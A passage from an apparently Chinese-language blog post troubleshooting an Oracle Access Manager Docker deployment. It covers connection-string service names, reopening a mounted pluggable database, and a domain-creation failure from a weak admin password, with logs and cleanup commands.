</span></span><span style=display:flex><span>ORCLPDB1 =   (DESCRIPTION =     (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521))     (CONNECT_DATA =       (SERVER = DEDICATED)       (SERVICE_NAME = ORCLPDB1.localdomain)     )   )
</span></span></code></pre></td></tr></table></div></div><p>所以只要，创建容器时<code>CONNECTION_STRING</code> 使用 <code>172.17.0.1:1521/ORCLPDB1.localdomain</code> 而不是 <code>172.17.0.1:1521/ORCLCDB.localdomain</code> 就能解决这个错误。</p><h4 id=报错三无法执行sql>报错三：无法执行SQL<a hidden class=anchor aria-hidden=true href=#报错三无法执行sql>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ERROR - RCU-6005 Unable to execute sql query.
</span></span><span style=display:flex><span>CAUSE - RCU-6005 Database not in open state.
</span></span><span style=display:flex><span>ACTION - RCU-6005 Make sure that the database is open.
</span></span></code></pre></td></tr></table></div></div><h4 id=解决三打开pdb>解决三：打开PDB<a hidden class=anchor aria-hidden=true href=#解决三打开pdb>#</a></h4><p>为了解决报错而胡乱操作了数据库，其中一个动作关闭了PDB，从而导致了这个错误。打开它就好了。</p><p>SQL> <strong>select name,open_mode from v$pdbs;</strong></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>NAME
</span></span><span style=display:flex><span>--------------------------------------------------------------------------------
</span></span><span style=display:flex><span>OPEN_MODE
</span></span><span style=display:flex><span>----------
</span></span><span style=display:flex><span>ORCLPDB1
</span></span><span style=display:flex><span>MOUNTED
</span></span></code></pre></td></tr></table></div></div><p>SQL> <strong>alter pluggable database ORCLPDB1 open;</strong></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-29-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-29-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Pluggable database altered.
</span></span></code></pre></td></tr></table></div></div><p>SQL> <strong>select name,open_mode from v$pdbs;</strong></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>NAME
</span></span><span style=display:flex><span>--------------------------------------------------------------------------------
</span></span><span style=display:flex><span>OPEN_MODE
</span></span><span style=display:flex><span>----------
</span></span><span style=display:flex><span>ORCLPDB1
</span></span><span style=display:flex><span>READ WRITE
</span></span></code></pre></td></tr></table></div></div><h4 id=报错四创建domain失败>报错四：创建domain失败<a hidden class=anchor aria-hidden=true href=#报错四创建domain失败>#</a></h4><p>日志详情：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-56>56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-57>57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-58>58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-59>59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-60>60</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-61><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-61>61</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-62><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-62>62</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-63><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-63>63</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-64><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-64>64</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-65><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-65>65</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-66><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-66>66</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-67><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-67>67</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain
</span></span><span style=display:flex><span>RCUPREFIX=OAM1
</span></span><span style=display:flex><span>DOMAIN_HOME=/u01/oracle/user_projects/domains/access_domain
</span></span><span style=display:flex><span>INFO: Admin Server not configured. Will run RCU and Domain Configuration Phase...
</span></span><span style=display:flex><span>Configuring Domain for first time 
</span></span><span style=display:flex><span>Start the Admin and Managed Servers  
</span></span><span style=display:flex><span>=====================================
</span></span><span style=display:flex><span>Loading RCU Phase
</span></span><span style=display:flex><span>=================
</span></span><span style=display:flex><span>CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain
</span></span><span style=display:flex><span>RCUPREFIX=OAM1
</span></span><span style=display:flex><span>jdbc_url=jdbc:oracle:thin:@172.17.0.1:1521/ORCLPDB1.localdomain
</span></span><span style=display:flex><span>Creating Domain 1st execution
</span></span><span style=display:flex><span>Loading RCU into database with RCUPREFIX OAM1
</span></span><span style=display:flex><span>Domain Configuration Phase
</span></span><span style=display:flex><span>==========================
</span></span><span style=display:flex><span>/u01/oracle/oracle_common/common/bin/wlst.sh -skipWLSModuleScanning /u01/oracle/dockertools/create_domain.py -oh /u01/oracle -jh /u01/jdk -parent /u01/oracle/user_projects/domains -name access_domain -user weblogic -password password -rcuDb 172.17.0.1:1521/ORCLPDB1.localdomain -rcuPrefix OAM1 -rcuSchemaPwd password -isSSLEnabled true
</span></span><span style=display:flex><span>Cmd is /u01/oracle/oracle_common/common/bin/wlst.sh -skipWLSModuleScanning /u01/oracle/dockertools/create_domain.py -oh /u01/oracle -jh /u01/jdk -parent /u01/oracle/user_projects/domains -name access_domain -user weblogic -password password -rcuDb 172.17.0.1:1521/ORCLPDB1.localdomain -rcuPrefix OAM1 -rcuSchemaPwd password -isSSLEnabled true
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Initializing WebLogic Scripting Tool (WLST) ...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Welcome to WebLogic Server Administration Scripting Shell
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Type help() for help on available commands
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>create_domain.py called with the following inputs:
</span></span><span style=display:flex><span>INFO: sys.argv[0] = /u01/oracle/dockertools/create_domain.py
</span></span><span style=display:flex><span>INFO: sys.argv[1] = -oh
</span></span><span style=display:flex><span>INFO: sys.argv[2] = /u01/oracle
</span></span><span style=display:flex><span>INFO: sys.argv[3] = -jh
</span></span><span style=display:flex><span>INFO: sys.argv[4] = /u01/jdk
</span></span><span style=display:flex><span>INFO: sys.argv[5] = -parent
</span></span><span style=display:flex><span>INFO: sys.argv[6] = /u01/oracle/user_projects/domains
</span></span><span style=display:flex><span>INFO: sys.argv[7] = -name
</span></span><span style=display:flex><span>INFO: sys.argv[8] = access_domain
</span></span><span style=display:flex><span>INFO: sys.argv[9] = -user
</span></span><span style=display:flex><span>INFO: sys.argv[10] = weblogic
</span></span><span style=display:flex><span>INFO: sys.argv[11] = -password
</span></span><span style=display:flex><span>INFO: sys.argv[12] = password
</span></span><span style=display:flex><span>INFO: sys.argv[13] = -rcuDb
</span></span><span style=display:flex><span>INFO: sys.argv[14] = 172.17.0.1:1521/ORCLPDB1.localdomain
</span></span><span style=display:flex><span>INFO: sys.argv[15] = -rcuPrefix
</span></span><span style=display:flex><span>INFO: sys.argv[16] = OAM1
</span></span><span style=display:flex><span>INFO: sys.argv[17] = -rcuSchemaPwd
</span></span><span style=display:flex><span>INFO: sys.argv[18] = password
</span></span><span style=display:flex><span>INFO: sys.argv[19] = -isSSLEnabled
</span></span><span style=display:flex><span>INFO: sys.argv[20] = true
</span></span><span style=display:flex><span>INFO: Creating Admin server...
</span></span><span style=display:flex><span>INFO: Enabling SSL PORT for AdminServer...
</span></span><span style=display:flex><span>Error: set() failed. Do dumpStack() to see details.
</span></span><span style=display:flex><span>Error: runCmd() failed. Do dumpStack() to see details.
</span></span><span style=display:flex><span>Problem invoking WLST - Traceback (innermost last):
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 513, in ?
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 123, in createOAMDomain
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 184, in createBaseDomain
</span></span><span style=display:flex><span>  File &#34;/tmp/WLSTOfflineIni5785928536971827845.py&#34;, line 79, in set
</span></span><span style=display:flex><span>  File &#34;/tmp/WLSTOfflineIni5785928536971827845.py&#34;, line 19, in command
</span></span><span style=display:flex><span>	at com.oracle.cie.domain.script.jython.CommandExceptionHandler.handleException(CommandExceptionHandler.java:69)
</span></span><span style=display:flex><span>	at com.oracle.cie.domain.script.jython.WLScriptContext.handleException(WLScriptContext.java:3085)
</span></span><span style=display:flex><span>	at com.oracle.cie.domain.script.jython.WLScriptContext.runCmd(WLScriptContext.java:738)
</span></span><span style=display:flex><span>	at sun.reflect.GeneratedMethodAccessor132.invoke(Unknown Source)
</span></span><span style=display:flex><span>	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
</span></span><span style=display:flex><span>	at java.lang.reflect.Method.invoke(Method.java:498)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>com.oracle.cie.domain.script.jython.WLSTException: com.oracle.cie.domain.script.jython.WLSTException
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Domain Creation Failed.. Please check the Domain Logs
</span></span></code></pre></td></tr></table></div></div><p>可以从48行看到是在 <code>Creating Admin server...</code> 阶段出错的。</p><h4 id=解决四提高admin_password-密码复杂度>解决四：提高<code>ADMIN_PASSWORD</code> 密码复杂度<a hidden class=anchor aria-hidden=true href=#解决四提高admin_password-密码复杂度>#</a></h4><p>需要注意的是每次失败重试之前要先删除之前留下的痕迹。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>sudo docker rm oamadmin
</span></span><span style=display:flex><span>sudo rm -rf /scratch/user_projects/*
